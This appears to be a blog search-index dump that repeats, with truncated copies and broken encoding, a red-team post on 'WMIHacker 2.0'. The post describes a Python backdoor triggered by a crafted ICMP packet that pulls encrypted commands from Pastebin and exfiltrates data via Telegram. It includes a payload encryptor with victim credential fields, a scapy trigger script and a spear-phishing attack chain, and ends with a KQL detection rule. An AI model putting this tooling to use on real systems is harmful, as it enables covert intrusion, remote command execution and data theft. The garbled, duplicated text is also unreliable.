C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; 